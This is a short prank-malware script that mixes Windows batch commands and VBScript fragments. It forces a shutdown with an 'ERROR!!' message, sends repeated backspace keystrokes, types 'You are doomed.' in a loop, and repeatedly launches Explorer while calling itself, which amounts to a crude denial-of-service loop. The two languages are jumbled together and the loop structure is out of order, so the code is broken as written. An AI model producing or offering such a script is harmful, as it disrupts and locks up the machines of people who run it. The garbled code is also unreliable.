
@echo off
shutdown -c “ERROR!!” -s    
MsgBox "Let's go back a few steps"
Set wshShell =wscript.CreateObject("WScript.Shell")
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop
Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "You are doomed."
@echo off
:repeat
Explorer
call loop.bat 
Goto repeat